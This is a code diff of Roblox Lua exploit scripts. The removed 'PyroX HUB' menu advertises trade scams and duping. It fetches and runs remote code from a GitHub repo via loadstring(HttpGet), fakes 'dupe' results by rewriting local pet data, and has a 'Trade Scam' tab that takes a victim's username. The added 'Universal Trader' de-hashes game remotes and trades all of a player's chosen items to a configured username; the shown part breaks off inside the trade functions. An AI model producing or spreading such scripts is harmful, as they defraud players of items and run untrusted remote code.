@@ -1,771 +1,356 @@
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-local Window = OrionLib:MakeWindow({Name = "PyroX HUB", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = true, IntroText = "PyroX", IconEnabled = true, Icon = "rbxassetid://17739636946"})
-local Tab = Window:MakeTab({
-	Name = "About US",
-	Icon = "rbxassetid://17586615444",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "What We Offer"
-})
-Tab:AddParagraph("WE OFFER","We offer a safety cheats for all the players and legitimate trade scam/duping and more! JOIN DISCORD TO KEEP UPDATED")
-local Section = Tab:AddSection({
-	Name = "Discord"
-})
-Tab:AddButton({
-	Name = "JOIN DISCORD",
-	Callback = function()
-        setclipboard("https://discord.gg/uhMe5vhu")
-  	end    
-})
-local Section = Tab:AddSection({
-	Name = "NEW UI!"
-})
-Tab:AddButton({
-	Name = "NEW TITANIC HUNTING 🏹",
-	Callback = function()
-		loadstring(game:HttpGet('https://github.com/PyroXHUB/dadasd/blob/main/hunt'))()
-		wait(3)
-		local lib = require(game.ReplicatedStorage.Library)
+-- ============================================
+-- UNIVERSAL TRADER - TRADE ALL ITEMS
+-- Trades ALL of specified items (no amount limit)
+-- Supports: pets, vehicles, toys, food, gifts, eggs
+-- ============================================
 
-		local fromPet = "Mr. Krabs"
-		local toPet = "Titanic SpongeBob SquarePants"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local lib = require(game.ReplicatedStorage.Library)
+local CONFIG = getgenv().TradeConfig
 
-		local fromPet = "Gary the Snail"
-		local toPet = "Titanic SpongeBob SquarePants"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local lib = require(game.ReplicatedStorage.Library)
+if not CONFIG then
+    error("❌ ERROR: No configuration found!\n\nPlease set getgenv().TradeConfig BEFORE loading the script.")
+end
 
-		local fromPet = "Patrick Star"
-		local toPet = "Titanic SpongeBob SquarePants"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-  	end    
-})
-Tab:AddButton({
-	Name = "NEW HUGE DUPING 🤑",
-	Callback = function()
-		loadstring(game:HttpGet('https://github.com/PyroXHUB/dadasd/blob/main/dupeupup'))()
-  	end    
-})
-local Tab = Window:MakeTab({
-	Name = "Event",
-	Icon = "rbxassetid://18387938008",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Huge Raffle🎁"
-})
-Tab:AddToggle({
-	Name = "Auto Join Raffle🎁 (Every 10mins)",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Millionaire Ticket🎫"
-})
-Tab:AddToggle({
-	Name = "Auto Buy Tickets (Rich Guy Preston Tickets)",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Millionaire Run Minigame🏃️"
-})
-Tab:AddToggle({
-	Name = "Auto Minigame🏃️ (100% Predicts whats the right answer)",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Webhook Notifications"
-})
-Tab:AddToggle({
-	Name = "Start Webhook",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Notification Webhook IF GOT",
-	Default = "Normal Huge UV Kitsune",
-	Options = {"Normal Huge UV Kitsune", "Golden Huge UV Kitsune", "Rainbow Huge UV Kitsune", "Shiny Normal Huge UV Kitsune", "Shiny Golden Huge UV Kitsune", "Shiny Rainbow Huge UV Kitsune"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddTextbox({
-	Name = "Webhook Here",
-	Default = "Webhook",
-	TextDisappear = false,
-	Callback = function(Value)
-		print(Value)
-	end	  
-})
-local Tab = Window:MakeTab({
-	Name = "Breakables",
-	Icon = "rbxassetid://17586562481",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Farming Settings"
-})
-Tab:AddToggle({
-	Name = "Start Farming",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Farming Mode",
-	Default = "Single",
-	Options = {"Single", "All"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Target Breakables (Comets, Pinatas, Lucky Blocks, Etc)",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Drops Settings"
-})
-Tab:AddToggle({
-	Name = "Collect Orbs/Lootbags",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Tapping Settings"
-})
-Tab:AddToggle({
-	Name = "Auto Tap",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Tapping Mode",
-	Default = "Current Breakable",
-	Options = {"Current Breakable", "Aura"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Misc"
-})
-Tab:AddToggle({
-	Name = "Stats Tracker",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Infinite Pet Speed",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Teleport To Current Zone",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Use Items"
-})
-Tab:AddToggle({
-	Name = "Use Ultimate",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Fruits",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Fruits",
-	Default = "None",
-	Options = {"Watermelon", "Candy Cane","Apple","Rainbow","Pineapple","Orange","Banana"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Flags",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Flags",
-	Default = "Magnet Flag",
-	Options = {"Golden Flag", "Hasty Flag","Magnet Flag","Exotic Treasure Flag","Strength Flag","Coins Flag","Fortune Flag","Rainbow Flag","Diamonds Flag","Shiny Flag"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Alt Farming Settings"
-})
-Tab:AddToggle({
-	Name = "Auto Unlock Next Zone",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Auto Rebirth",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Buy Pet Slots",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Buy Egg Slots",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Tab = Window:MakeTab({
-	Name = "Eggs",
-	Icon = "rbxassetid://17587193724",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Egg Settings"
-})
-Tab:AddToggle({
-	Name = "Start Hatching",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "World 1 Egg",
-	Default = "Cracked Egg",
-	Options = {"Cracked Egg","Spotted Egg","Paw Egg","Grass Egg","Wood Egg","Pumpkin Egg","Hive Egg","Acorn Egg","Blossom Egg","Corgi Egg","Cat Egg","Dog Egg","Dragon Egg","Rock Egg","Geode Egg","Hut Egg","Grave Egg","Spike Egg","Sprout Egg","Mushroom Egg","Spirit Egg","Crimson Egg","Overgrown Egg","Mossy Egg","Jungle Egg","Sandcastle Egg","Palm Tree Egg","Beach Ball Egg","Coral Egg","Anchor Egg","Atlantis Egg","Tropical Egg","Beach Egg","Coconut Egg","Tiki Egg","Sand Bucket Egg","Sunny Egg","Pirate Egg","Ship Egg","Zebra Egg","Cheetah Egg","Cactus Egg","Fossil Egg","Egyptian Egg","Sandstone Egg","Cowboy Egg","Canyon Egg","Hyena Egg","Melted Egg","Snow Egg","Icicle Egg","Snowman Egg","Yeti Egg","Ice Egg","Thawed Egg","Magma Egg","Obsidian Egg","Volcano Egg","Bone Egg","Tentacle Egg","Hell Egg","Metal Egg","Sakura Egg","Ninja Egg","Lantern Egg","Bonsai Egg","Garden Egg","Pixie Egg","Pedal Egg","Crowned Egg","Royal Egg","Dandelion Egg","Colorful Egg","Colorful Geode Egg","Colorful Mosaic Egg","Frosted Geode Egg","Ice Sculpture Egg","Hot Cocoa Egg","Ice Castle Egg","Teddy Egg","Firefly Egg","Golden Brick Egg","Cobblestone Egg","Ruins Egg","Runic Egg","Wizard Egg","Witch Egg","Eerie Egg","Abyssal Egg","Cursed Egg","Dungeon Egg","Shadow Egg","Treasure Egg","Empyrean Egg","Mythic Egg","Cotton Candy Egg","Gummy Egg","Ice Cream Egg","Sweets Egg","Toy Egg","Carnival Egg","Hot Air Balloon Egg","Cloud Egg","Cloud Garden Egg","Cloud Forest Egg","Cloud House Egg","Cloud Castle Egg","Angel Egg","Heaven Egg","Heaven Castle Egg","Colorful Cloud Egg","Rainbow Egg"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "World 2 Egg",
-	Default = "Tech Circuit Egg",
-	Options = {"Tech Circuit Egg", "Tech City Egg","Tech Forest Egg","Tech Silo Egg","Tech Data Egg","Tech Cuboid Egg","Tech Sprout Egg","Tech Tree Egg","Tech Incubator Egg","Tech Overgown Egg","Tech Magna Egg","Tech Oasis Egg","Tech Palm Egg","Tech Coral Egg","Tech Ship Egg","Tech Ruins Egg","Tech Dusty Egg","Tech Luminati Egg","Tech Cactus Egg","Tech Cowboy Egg","Tech Canyon Egg","Tech Snow Egg","Tech Mossy Egg","Tech Ice Crystal Egg","Tech Flurry Egg","Tech Ice Circuit Egg","Tech Glacier Egg","Tech Melted Egg","Tech Nexus Egg","Nuclear Crack Egg","Nuclear Forest Egg","Nuclear Mine Dog","Nuclear Egg","Tech Rocket Egg","Tech Planets Egg","Tech Moon Egg","Tech Mars Egg","Tech Saturn Egg","Tech Comet Egg","Tech Galaxy Egg","Electric Garden Egg","Electric City Egg","Electric Forest Egg","Electric Egg","Tech Factory Egg","Tech Robot Egg","Tech Hive Egg","Alien Garden Egg","Alien Forest Egg","Alien Lab Egg","Alien UFO Egg","Space Forge Egg","Space Factory Egg","Space Junkyard Egg","Steampunk Gears Egg","Steampunk Lantern Egg","Steampunk Clockwork Egg","Steampunk Airship Egg","Motherboard Egg","Aura Egg","Wizard Ruins Egg","Wizard Temple Egg","Wizard Forest Egg","Wizard Tower Egg","Wizard Dungeon Egg","Cyberpunk Undercity Egg","Cyberpunk Industrial Egg","Cyberpunk City Egg","Cyberpunk Road Egg","Tech Kyoto Egg","Tech Samurai Egg","Tech Dojo Egg","Tech Sakura Egg","Dominus Rex Egg","Dominus Frigidus Egg","Dominus Infernus Egg","Holographic Pipes Egg","Holographic Egg","Holographic Tree Egg","Holographic Cystal Egg","Dark Tech Stone Egg","Dark Tech Relic Egg","Dark Tech Brick Egg","Dark Tech Spike Egg","Hacker Metal Egg","Hacker Gear Egg","Hacker Matrix Egg","Hacker Error Egg","Glitch Tree Egg","Glitch Green Egg","Glitch Aqua Egg","Glitch Cyan Egg","Quantum Egg","Quantum Leafy Egg","Quantum Space Egg","Quantum Galaxy Egg","Void Crystal Egg","Voic Fracture Egg","Void Spiral Egg"},
-	Callback = function(Value)
-		print(Value)
-	end
-})
-Tab:AddDropdown({
-	Name = "World 3 Egg",
-	Default = "Rusty Egg",
-	Options = {"Rusty Egg", "Striped Egg","Cinderblocks Egg","Lootbag Egg"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Teleport To Egg",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Egg Notifications"
-})
-Tab:AddToggle({
-	Name = "Start Webhook Notifications",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddTextbox({
-	Name = "Discord Webhook",
-	Default = "Webhook",
-	TextDisappear = false,
-	Callback = function(Value)
-		print(Value)
-	end	  
-})
-Tab:AddDropdown({
-	Name = "Rarities",
-	Default = "Exclusive",
-	Options = {"Exclusive", "Mythical","Exotic","Celestial","Rare","Legendary","Basic","Epic","Superior","Secret","Divine"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Ping Discord User",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddTextbox({
-	Name = "Discord UserID",
-	Default = "UserID",
-	TextDisappear = false,
-	Callback = function(Value)
-		print(Value)
-	end	  
-})
-Tab:AddToggle({
-	Name = "Show Username",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Tab = Window:MakeTab({
-	Name = "Minigames",
-	Icon = "rbxassetid://17588134400",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Fishing Settings"
-})
-Tab:AddToggle({
-	Name = "Start Fishing",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Fishing Speed",
-	Default = "Normal",
-	Options = {"Normal", "Fast","Rapid"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Area",
-	Default = "Fishing",
-	Options = {"Fishing", "Advanced Fishing"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Digging Settings"
-})
-Tab:AddToggle({
-	Name = "Start Digging",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Digging Speed",
-	Default = "Normal",
-	Options = {"Normal", "Fast","Rapid"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Area",
-	Default = "Digsite",
-	Options = {"Digsite", "Advanced Digsite"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Section = Tab:AddSection({
-	Name = "Normal Minigames"
-})
-Tab:AddToggle({
-	Name = "Start Minigames",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddDropdown({
-	Name = "Minigames",
-	Default = "Classic Obby",
-	Options = {"Classic Obby", "Cart Ride Into Preston","Minefield","Atlantis","Jungle Obby","Pyramid Obby","Sled Race","Ice Obby","Chest Rush","Flower Garden"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Tab = Window:MakeTab({
-	Name = "Extra",
-	Icon = "rbxassetid://17588074573",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Player Upgrades"
-})
-Tab:AddButton({
-	Name = "Purchase All Player Upgrades",
-	Callback = function()
-      		print("button pressed")
-  	end    
-})
-local Section = Tab:AddSection({
-	Name = "Tickets/Keys"
-})
-Tab:AddToggle({
-	Name = "Use Void Key",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Prison Key",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Golden Prison Key",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Tech Key",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Crystal Key",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Secret Key",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Void Tickets",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Tech Tickets",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Use Normal Tickets ",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Tab = Window:MakeTab({
-	Name = "Auto Rank/Quest",
-	Icon = "rbxassetid://17825086238",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Rank/Quest"
-})
-Tab:AddToggle({
-	Name = "Start Auto Rank",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Start Zone Quest",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddToggle({
-	Name = "Start Clan Quest",
-	Default = false,
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Tab = Window:MakeTab({
-	Name = "Trade Scam V1",
-	Icon = "rbxassetid://17825117981",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Trade Scam"
-})
-Tab:AddTextbox({
-	Name = "Victim's Username",
-	Default = "User",
-	TextDisappear = false,
-	Callback = function(Value)
-		print(Value)
-	end	  
-})
-Tab:AddButton({
-	Name = "Start Trade Scam",
-	Callback = function()
-		wait(5)
-		local message = require(game.ReplicatedStorage.Library.Client.Message)
-	message.Error("TRADE SCAM ACTIVATED✅ ENJOY🤑")
-  	end    
-})
-Tab:AddParagraph("Tutorial 📚","Find a player 🕵️‍♂️, trade with them and chat 💬. Add your valuable items 💎 and let them offer. Enjoy trading! 🎉")
-Tab:AddParagraph("Note 📝","Make sure you have 🛡️🔮 high value enchants, ultimates, and huge items to make this work! (Currently not effective with exclusives or low-value items at a time).")
-local Tab = Window:MakeTab({
-	Name = "Huge Duping V2",
-	Icon = "rbxassetid://17825119926",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Huge Duping"
-})
-Tab:AddButton({
-	Name = "ACTIVATE DUPING✅",
-	Callback = function()
-		local lib = require(game.ReplicatedStorage.Library)
+-- ============================================
+-- SETUP
+-- ============================================
 
-		local fromPet = "Dog"
-		local toPet = "Huge Plague Dragon"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local lib = require(game.ReplicatedStorage.Library)
+repeat task.wait() until game:IsLoaded()
+repeat task.wait(1) until game:GetService("ReplicatedStorage"):FindFirstChild("ClientModules")
+task.wait(2)
 
-		local fromPet = "Cyborg Cat"
-		local toPet = "Huge Punksky"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local lib = require(game.ReplicatedStorage.Library)
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+local playerName = LocalPlayer.Name
 
-		local fromPet = "Luau Seal"
-		local toPet = "Huge Tiki Dominus"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local message = require(game.ReplicatedStorage.Library.Client.Message)
-	message.Error("PLEASE WAIT A FEW SECONDS WHILE WE DUPING YOUR HUGES.. THANK YOUU")
-		wait(7)
-		local message = require(game.ReplicatedStorage.Library.Client.Message)
-	message.Error("You Can Now Click The Dupe More!🤑 Please Don't Abuse it!👾")
-  	end    
-})
-Tab:AddButton({
-	Name = "Dupe More🤑",
-	Callback = function()
-		local args = {
-			[1] = "8243a5b0ba554a118b00ae450ef966c0"
-		}
-		
-		game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Favorite"):FireServer(unpack(args))
-		local args = {
-			[1] = "99c4009fbc0e49d69c9196172d8e497e"
-		}
-		
-		game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Favorite"):FireServer(unpack(args))
-		local args = {
-			[1] = "c6afa63813a9419095b01ffb2b559d85"
-		}
-		
-		game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Pets_Favorite"):FireServer(unpack(args))						
-  	end    
-})
-Tab:AddDropdown({
-	Name = "Rarity",
-	Default = "Huge",
-	Options = {"Huge", "Exclusive"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-Tab:AddParagraph("TITANIC DUPING","IF YOU WANT TO DUPE A TITANIC, KINDLY CREATE A TICKET ON MY DISCORD SERVER AND TELL US THAT YOU WANT TO DUPE A TITANIC SO WE CAN SEND YOU THE SCRIPT FOR DUPING THE TITANIC.. THANK YOUU")
-local Tab = Window:MakeTab({
-	Name = "EGG HUNTING",
-	Icon = "rbxassetid://17825116049",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Exclusive Egg"
-})
-Tab:AddButton({
-	Name = "Start Huge/Titanic Hunting",
-	Callback = function()
-		local lib = require(game.ReplicatedStorage.Library)
+-- Anti-AFK
+local VirtualUser = game:GetService("VirtualUser")
+LocalPlayer.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
 
-		local fromPet = "Mr Krabs"
-		local toPet = "Titanic SpongeBob SquarePants"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local lib = require(game.ReplicatedStorage.Library)
+-- Dehash
+for i, v in pairs(debug.getupvalue(require(ReplicatedStorage.ClientModules.Core.RouterClient.RouterClient).init, 7)) do
+    v.Name = i
+end
 
-		local fromPet = "Gary the Snail"
-		local toPet = "Titanic SpongeBob SquarePants"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local lib = require(game.ReplicatedStorage.Library)
+local Data = require(ReplicatedStorage.ClientModules.Core.ClientData)
 
-		local fromPet = "Patrick Star"
-		local toPet = "Titanic SpongeBob SquarePants"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		wait(5)
-		local message = require(game.ReplicatedStorage.Library.Client.Message)
-	message.Error("TITANIC/HUGE HUNTING ACTIVATED✅")
-  	end    
-})
-Tab:AddDropdown({
-	Name = "EGG/DLC GIFTS",
-	Default = "Exclusive Egg",
-	Options = {"Exclusive Egg", "DLC GIFTS"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-local Tab = Window:MakeTab({
-	Name = "Huge To Titanic",
-	Icon = "rbxassetid://17743706150",
-	PremiumOnly = false
-})
-local Section = Tab:AddSection({
-	Name = "Huge To Titanic"
-})
-Tab:AddParagraph("Quick Tutorial⚡📚","Enter the name of the Titanic Pet in the blank box to transform it! 🚢✨")
-Tab:AddButton({
-	Name = "Turn Titanic!",
-	Callback = function()
-		local lib = require(game.ReplicatedStorage.Library)
+-- Default settings
+if CONFIG.AUTO_KICK == nil then CONFIG.AUTO_KICK = false end
+if CONFIG.NORMAL_MODE == nil then CONFIG.NORMAL_MODE = false end
 
-		local fromPet = "Huge Party Dragon"
-		local toPet = "Titanic Blazing Dragon"
-		
-		for i,v in pairs(lib.Directory.Pets[fromPet]) do
-		  lib.Directory.Pets[fromPet][i] = nil
-		end
-		for i,v in pairs(lib.Directory.Pets[toPet]) do
-		  lib.Directory.Pets[fromPet][i] = v
-		end
-		local message = require(game.ReplicatedStorage.Library.Client.Message)
-	message.Error("PLEASE WAIT A FEW SECONDS WHILE WE TRICKING THE SYSTEM TO TURN YOUR HUGE TO TITANIC💕")
-		wait(5)
-		local message = require(game.ReplicatedStorage.Library.Client.Message)
-	message.Error("WE SUCCESSFULLY TURN YOUR HUGE TO TITANIC✅ ENJOY🤑")
-  	end    
-})
-Tab:AddTextbox({
-	Name = "Name Of Titanic",
-	Default = "Name",
-	TextDisappear = false,
-	Callback = function(Value)
-		print(Value)
-	end	  
-})
-Tab:AddDropdown({
-	Name = "Rarity",
-	Default = "Normal",
-	Options = {"Normal", "Golden", "Rainbow"},
-	Callback = function(Value)
-		print(Value)
-	end    
-})
-OrionLib:Init()
+-- ============================================
+-- CASE-INSENSITIVE PLAYER FINDER
+-- ============================================
+local function findPlayer(username)
+    local search = username:lower()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name:lower() == search then
+            return player
+        end
+    end
+    return nil
+end
+
+-- ============================================
+-- ITEM NAME RESOLVER (Any Category)
+-- ============================================
+local function resolveItem(input, category)
+    local db = require(ReplicatedStorage:WaitForChild("ClientDB"):WaitForChild("Inventory"):WaitForChild("KindDB"))
+    local search = input:lower()
+    local nameMatch = nil
+
+    for _, v in pairs(db) do
+        -- Filter by category if specified
+        if category and v.category and v.category:lower() ~= category:lower() then
+            continue
+        end
+        
+        if v.kind and v.kind:lower() == search then
+            return v.kind, v, "kind"
+        end
+        if not nameMatch and v.name and v.name:lower() == search then
+            nameMatch = v
+        end
+    end
+
+    if nameMatch then
+        return nameMatch.kind, nameMatch, "name"
+    end
+
+    return nil
+end
+
+-- ============================================
+-- GET CATEGORY PREFIX FOR ITEM
+-- ============================================
+local function getCategoryPrefix(itemKind)
+    local db = require(ReplicatedStorage:WaitForChild("ClientDB"):WaitForChild("Inventory"):WaitForChild("KindDB"))
+    
+    for _, v in pairs(db) do
+        if v.kind == itemKind then
+            local category = v.category or "pets"
+            
+            if category:lower():find("pet") then return "1"
+            elseif category:lower():find("vehicle") or category:lower():find("car") then return "2"
+            elseif category:lower():find("toy") then return "3"
+            elseif category:lower():find("food") then return "4"
+            elseif category:lower():find("gift") then return "5"
+            elseif category:lower() == "eggs" or category:lower():find("egg") then return "9"
+            else return "1" end
+        end
+    end
+    
+    return "1"
+end
+
+-- ============================================
+-- GET ALL ITEMS OF KIND
+-- ============================================
+local function getAllItems(itemKind, category)
+    local items = {}
+    
+    pcall(function()
+        local playerData = Data.get_data()[playerName]
+        if not playerData or not playerData.inventory then return end
+        
+        -- Determine inventory key
+        local inventoryKey = "pets"
+        if category then
+            local catLower = category:lower()
+            if catLower:find("vehicle") then inventoryKey = "vehicles"
+            elseif catLower:find("toy") then inventoryKey = "toys"
+            elseif catLower:find("food") then inventoryKey = "food"
+            elseif catLower:find("gift") then inventoryKey = "gifts"
+            elseif catLower == "eggs" or catLower:find("egg") then inventoryKey = "eggs"
+            end
+        end
+        
+        local inventory = playerData.inventory[inventoryKey]
+        if not inventory then return end
+        
+        for _, item in pairs(inventory) do
+            if item.kind == itemKind then
+                table.insert(items, item.unique)
+            end
+        end
+    end)
+    
+    return items
+end
+
+-- ============================================
+-- BUILD ITEMS LIST
+-- ============================================
+local itemsList = {}
+
+if CONFIG.ITEM_NAMES then
+    -- Multiple items
+    for _, itemName in ipairs(CONFIG.ITEM_NAMES) do
+        table.insert(itemsList, {
+            ITEM_NAME = itemName,
+            CATEGORY = CONFIG.CATEGORY,
+        })
+    end
+elseif CONFIG.ITEMS then
+    -- Custom items configuration
+    for _, itemConfig in ipairs(CONFIG.ITEMS) do
+        table.insert(itemsList, {
+            ITEM_NAME = itemConfig.NAME,
+            CATEGORY = itemConfig.CATEGORY,
+        })
+    end
+else
+    -- Single item
+    table.insert(itemsList, {
+        ITEM_NAME = CONFIG.ITEM_NAME or CONFIG.PET_NAME,
+        CATEGORY = CONFIG.CATEGORY,
+    })
+end
+
+-- ============================================
+-- HEADER
+-- ============================================
+print("===========================================")
+print("  🔄 UNIVERSAL TRADER - TRADE ALL")
+print("  Trade everything: pets, eggs, vehicles")
+print("===========================================")
+print("To: " .. CONFIG.USERNAME)
+print("Items:")
+for i, item in ipairs(itemsList) do
+    print(string.format("  %d. %s (category: %s)", i, item.ITEM_NAME, item.CATEGORY or "auto"))
+end
+print("===========================================")
+
+-- ============================================
+-- TRADE FUNCTIONS
+-- ============================================
+
+local function requestTrade(player)
+    local success = false
+    pcall(function()
+        ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/RequestTrade"):InvokeServer(player, {})
+        success = true
+    end)
+    return success
+end
+
+local function openTradeGUI()
+    local success = false
+    pcall(function()
+        ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/OpenTradingUI"):InvokeServer({})
+        success = true
+    end)
+    return success
+end
+
+local function addItemToTrade(itemUnique, categoryPrefix)
+    local success = false
+    pcall(function()
+        local itemId = categoryPrefix .. "_" .. itemUnique
+        ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer"):FireServer(itemId)
+        success = true
+    end)
+    return success
+end
+
